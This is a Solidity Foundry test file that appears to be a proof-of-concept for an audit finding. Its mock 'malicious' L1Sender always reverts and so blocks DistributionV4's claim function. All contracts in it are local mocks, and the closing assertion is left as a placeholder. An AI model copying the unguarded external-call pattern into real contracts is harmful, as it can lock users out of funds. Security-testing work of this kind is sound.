// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for L1Sender
interface IL1Sender {
    function sendMintMessage() external;
}

// Mock L1Sender contract that always reverts
contract MaliciousL1Sender is IL1Sender {
    function sendMintMessage() external override {
        revert("Malicious revert");
    }
}

// Mock interface for DistributionV4
interface IDistributionV4 {
    function claim() external;
}

contract ExploitTest is Test {
    // Contract instances
    IDistributionV4 distributionV4;
    MaliciousL1Sender maliciousL1Sender;

    address owner = address(0x1);
    address user = address(0x2);

    function setUp() public {
        // Deploy the malicious L1Sender contract
        maliciousL1Sender = new MaliciousL1Sender();

        // Deploy the DistributionV4 contract with the malicious L1Sender
        distributionV4 = IDistributionV4(address(new DistributionV4(address(maliciousL1Sender))));

        // Fund the user with some ETH for gas
        vm.deal(user, 1 ether);
    }

    function test_exploit() public {
        // Impersonate the user
        vm.prank(user);

        // Attempt to claim rewards, which should revert due to the malicious L1Sender
        vm.expectRevert("Malicious revert");
        distributionV4.claim();

        // Assert that the claim was unsuccessful (e.g., by checking a state variable or event)
        // This is a placeholder assertion, replace with actual state check if available
        // assertEq(distributionV4.hasClaimed(user), false);
    }
}

// Mock implementation of DistributionV4 for testing
contract DistributionV4 is IDistributionV4 {
    IL1Sender public l1Sender;

    constructor(address _l1Sender) {
        l1Sender = IL1Sender(_l1Sender);
    }

    function claim() external override {
        // Simulate the vulnerable claim logic
        l1Sender.sendMintMessage();
    }
}